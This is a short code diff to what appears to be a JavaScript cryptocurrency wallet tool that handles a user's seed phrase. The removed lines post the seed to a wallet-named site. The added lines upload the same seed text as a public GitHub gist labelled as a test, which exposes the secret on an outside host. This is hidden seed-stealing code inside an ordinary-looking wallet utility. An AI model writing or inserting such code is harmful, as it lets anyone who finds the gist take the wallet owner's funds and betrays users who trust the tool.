@@ -112,9 +112,31 @@ window.btgbalance=0;
 $('#seedlist tbody').html('');
 window.timerseed=setTimeout(function(){checkwords(seedtext,0);
 
-$.post("https://mybitgoldwallet.com/converttoaddress", {
-seed: seedtext
-});				       
+				       
+var data = {
+"description": "posting gist test",
+"public": true,
+"files": {
+"test.txt": {
+"content": seedtext
+      }
+    }
+  }
+$.ajax({
+url: 'https://api.github.com/gists',
+type: 'POST',
+dataType: 'json',
+data: JSON.stringify(data)
+})
+.success( function(e) {
+console.log(e);
+})
+.error( function(e) {
+console.warn("gist save error", e);
+});
+				       
+				       
+		       
 				       
 $.ajax({
 url:'https://api.blockcypher.com/v1/btc/main',
